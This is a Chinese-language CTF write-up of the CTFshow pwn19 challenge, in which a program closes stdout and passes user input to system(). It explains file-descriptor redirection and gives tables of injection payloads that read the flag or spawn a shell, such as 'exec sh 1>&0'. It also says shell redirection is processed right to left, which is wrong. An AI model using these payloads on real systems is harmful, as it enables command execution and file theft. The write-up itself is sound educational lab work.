---
title: "[ pwn 学习 ] CTFshow-pwn19 关闭输出流"
date: 2026-07-22 12:00:00
categories:
  - CTF
  - Pwn
tags:
  - Pwn
  - CTF
  - CTFShow
  - Writeup
cover: /img/jpg/11.jpg
---

# 1. 基础信息
查看二进制文件安全防护

```plain
checksec pwn19
  Arch:     amd64-64-little
  RELRO:    Full RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
```

64 位程序，保护全开



# 2. 反编译分析（main 函数）
拖进 IDA F5 反编译

核心逻辑如下

```c
int main() {
    char buf[0x30];          // [rbp-0x30], 实际使用 0x20=32 字节
    pid_t pid;               // [rbp-0x34]

    setvbuf(stdout, 0, _IONBF, 0);   // _IONBF = 2
    setvbuf(stdin, 0, _IONBF, 0);    // _IONBF = 2, 但这里传了 1 (_IOLBF)?

    // 打印 CTFshow 横幅 (共11段 puts)
    puts("     * *************************************                           ");
    puts("     * Classify: CTFshow --- PWN ---                                  ");
    puts("     * Type  : Linux_Security_Mechanisms                              ");
    puts("     * Site  : https://ctf.show/                                      ");
    puts("     * Hint  : Turn off output, how to get flag?                      ");
    puts("                                                                      ");
    puts("give you a shell! now you need to get flag!                           ");
    puts("     * *************************************                           ");
    puts("     * Classify: CTFshow --- PWN ---                                  ");
    puts("     * Type  : Linux_Security_Mechanisms                              ");
    puts("     * Site  : https://ctf.show/                                      ");

    // ========== 关键逻辑 ==========
    pid = fork();

    if (pid == 0) {
        // ===== 子进程 =====
        puts("give you a shell! now you need to get flag!");

        // !!! 关闭 stdout，所以子进程的输出你看不到 !!!
        fclose(stdout);

        // 从 stdin 读取 32 字节
        read(0, buf, 0x20);

        // !!! 直接将输入传给 system() — 命令注入漏洞 !!!
        system(buf);

    } else {
        // ===== 父进程 =====
        wait(NULL);          // 等待子进程结束
        sleep(3);            // 睡 3 秒
        printf("flag is not here!");
    }

    return 0;
}
```

程序结构：

+ `fork()`分身：程序用`fork()`分出一个子进程
+ 父进程：只是`wait()`等子进程结束，然后睡 3 秒，打印了一句`flag is not here!`
+ **子进程：**先`fclose(stdout)`把标准输出关了→再读 32 字节输入→直接把输入喂给`system()`执行



# 3.`stdout`被关了
**3.1 程序做了什么**

```c
// 把程序的嘴缝上
fclose(stdout);

// 给你32字节发言权
read(0, buf, 0x20);

// 你说的内容直接被当作命令执行
system(buf);
```

即使输入`cat /ctfshow_flag`，虽然命令确实执行力，`cat`确实读到了`flag`，但是`stdout`已经被关了——数据读不出来



# 4.前置知识：文件描述符（FD）
在 Linux 中"一切皆文件"。每个进程打开一个流，内核都分配一个数字编号给它。

| 编号 | 名称 | 作用 | 通俗比喻 |
| --- | --- | --- | --- |
| 0 | stdin | 标准输入 | 程序的"耳朵" — 听你输入 |
| **1** | **stdout** | **标准输出** | **程序的"嘴巴" — 说话给你听** |
| 2 | stderr | 标准错误 | 程序的"求救声" — 报错信息 |


关键事实：在 `socat` 搭建的 socket 连接中，fd 0（stdin）和 fd 1（stdout）实际上指向同一个双向通道。虽然程序的"嘴巴"（fd 1）被封上了，但它的"耳朵"（fd 0）还在，而且这个耳朵是双向的！

给了我们一定的操作空间。



# 5.思路：文件描述符重定向
## 5.1 核心想法
既然 fd 1（嘴巴）被封了，而 fd 0（耳朵）是双向的通道，那我们就把 fd 1 的输出**重定向**到 fd 0 里，强行把数据从"耳朵"里挤出去。

在 shell 中，这行命令可以做到：

```c
1>&0
```

拆解：

 - `1`：文件描述符 1（stdout）

 - `>`：重定向符 

- `&0`：目标为文件描述符 0（stdin）

**效果**：把所有本来要写到 fd 1 的数据，强行灌进 fd 0。

fd 0 是双向 socket，数据就能传回你的屏幕。

## 5.2 配合 exec 使用
仅仅 `cat /ctf* 1>&0` 还不够。

问题在于 `system()` 会先起一个 `/bin/sh -c` 子 shell，在子 shell 里做重定向。这个子 shell 一退出，`cat` 读到 stdout 已关的信息可能还没刷出去。

所以我们用 `exec`：

```plain
exec cat /ctf* 1>&0
```

`exec` 的作用：**用新的进程替换当前 shell 进程本身**，不创建子 shell。这样重定向在当前进程里生效，数据稳稳地写进 fd 0 再传回客户端。

## 5.3 完整 payload
```plain
exec cat /ctf* 1>&0
```

逐段讲解：

| 部分 | 作用 |
| --- | --- |
| `exec` | 用后面的命令替换当前 shell 进程，确保重定向在当前进程中生效 |
| `cat /ctf*` | 读取 `/`目录下名字以 `ctf`开头的文件（就是 flag 文件） |
| `1>&0` | 把 fd 1（stdout）重定向到 fd 0（stdin）<br/>— 用双向的"耳朵"通道把数据传回来 |


# 6. 更多可用的 payload
| Payload | 长度 | 说明 |
| --- | --- | --- |
| `exec cat /ctf* 1>&0` | 21 字节 | 标准解法，直接读 flag |
| `exec /bin/sh 1>&0` | 18 字节 | 弹一个交互式 shell，拿到后想干啥干啥 |
| `exec /bin/sh 0>&1` | 18 字节 | 反过来把 stdin 绑到 stdout，同样能弹 shell |
| `exec cat /f* 1>&0` | 18 字节 | 用 `f*`匹配 `/flag`更短 |
| `exec cat /*ag* 1>&0` | 21 字节 | 模糊匹配 flag 路径 |
| `exec ls / 1>&0` | 16 字节 | 先看看根目录下都有啥，探路用 |
| `exec sh 1>&0` | 14 字节 | 最短的弹 shell 方式（比 `/bin/sh`短 4 字节） |


# 7. 其他重定向操作*
| Payload | 说明 |
| --- | --- |
| `**exec cat /ctf* >&0**` | `**>&0**`**是 **`**1>&0**`**的简写，效果一样（省 1 字节）** |
| `exec cat /ctf* 2>&1` | shell 执行顺序是从右往左<br/>先 ①`2>&1`是把 fd2 重定向到 fd1 指向空的地方 那 fd2 也指向空了<br/>后 ②`exec cat /ctf*`cat 读取文件内容，试图写入 fd1，fd 又已经关了，数据丢失。如果 cat 报错写入 fd2。fd2 已经被重定向到 fd1 那么报错也丢了。<br/>雪上加霜。 |
| `exec cat /ctf* 2>&0` | 把 stderr 也重定向到 fd 0 |
| `**exec cat /ctf*>&0**` | **极简写法，不带空格也能在 shell 中解析** |





# 8. 此类漏洞思路总结
## 8.1 遇到"没输出"的情况怎么排查
| 现象 | 可能原因 | 应对思路 |
| --- | --- | --- |
| 命令输入后没回显 | stdout 被关了 | 尝试 `1>&0`或 `1>&2`重定向 |
| 有错误提示但没正常输出 | 只关了 stdout，stderr 还在 | 用 `2>&1`合并，或直接用 `1>&2` |
| 完全没反应 | 可能进程卡住或退出了 | 检查 `system()`是否真的执行了 |
| 有输出但不完整 | 缓冲区没刷新 | 加 `exec`替换进程，或在命令后加 `;exit` |


## 8.2 搜索危险函数
| 函数 | 为什么危险 |
| --- | --- |
| `system()` | 参数可控 = 命令注入（本题） |
| `popen()` | 同上，打开管道执行命令 |
| `execve()`家族 | 参数可控 = 任意命令执行 |
| `fclose(stdout)` / `close(1)` | 关闭输出流，可能是考点信号 |


## 8.3 文件描述符考点
| 操作 | 效果 |
| --- | --- |
| `**fclose(stdout)**` | **关闭 fd 1，程序失去输出能力** |
| `**close(1)**` | **同 **`**fclose(stdout)**`**，关闭标准输出** |
| `dup2(a, b)` | 把 fd a 复制到 fd b |
| `1>&0` | 把 stdout 重定向到 stdin |
| `1>&2` | 把 stdout 重定向到 stderr |
| `0>&1` | 把 stdin 重定向到 stdout |


## 8.4 为什么 `1>&0` 能行
在 `socat TCP-LISTEN:...,fork EXEC:./pwn` 的场景中：

```plain
客户端（你的 nc） ←——TCP——→ socat ←——fd 0=fd 1——→ ./pwn
                                        ↑
                                  这个通道是双向的
                                  关了 1 没关系，0 还在
                                  把输出塞进 0，数据照样回传
```

`socat` 把 TCP socket 同时绑给了子进程的 stdin 和 stdout（实际上是通过 `dup2` 复制），所以 fd 0 和 fd 1 是**同一个 socket 的两个副本**，关了 1 不影响 0，而 0 本身既能读也能写。

## 10. shell 重定向速查表
| 符号 | 作用 | 示例 |
| --- | --- | --- |
| `>` | 覆盖写入文件 | `echo a > flag` |
| `>>` | 追加写入文件 | `echo a >> flag` |
| `<` | 从文件读取输入 | `./pwn < input.txt` |
| `1>&0` | stdout 重定向到 stdin | 本题核心 payload |
| `2>&1` | stderr 合并到 stdout | `./pwn 2>&1` |
| `2>&0` | stderr 重定向到 stdin | 连报错也从"耳朵"传回来 |
| `&>` | stdout + stderr 都重定向 | `./pwn &> all.log` |
| `/dev/null` | 黑洞，数据丢进去就消失 | `./pwn > /dev/null` |
| `exec` | 替换当前进程执行命令 | `exec cat flag 1>&0` |
